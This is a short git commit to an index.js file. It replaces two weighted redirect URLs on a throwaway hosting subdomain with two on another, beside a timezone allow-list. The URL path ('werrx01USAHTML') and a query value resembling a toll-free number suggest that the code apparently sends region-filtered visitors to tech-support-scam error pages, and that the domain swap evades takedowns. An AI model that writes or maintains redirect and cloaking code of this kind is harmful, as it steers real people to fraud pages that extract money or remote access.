9107f80d283c8aa45474d7dda71d34e1ebb49669
paalakash <palaksh452@gmail.com>
2026-06-10 05:46:52 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://seashell-app-9gfhe.ondigitalocean.app/werrx01USAHTML/?bcda=1800-312-371", weight: 0.5 },
-    { url: "https://seashell-app-9gfhe.ondigitalocean.app/werrx01USAHTML/?bcda=1800-312-371", weight: 0.5 }
+    { url: "https://asdfghjklasd.on-forge.com/werrx01USAHTML/?bcda=1800-312-371", weight: 0.5 },
+    { url: "https://asdfghjklasd.on-forge.com/werrx01USAHTML/?bcda=1800-312-371", weight: 0.5 }
 
 ];
 
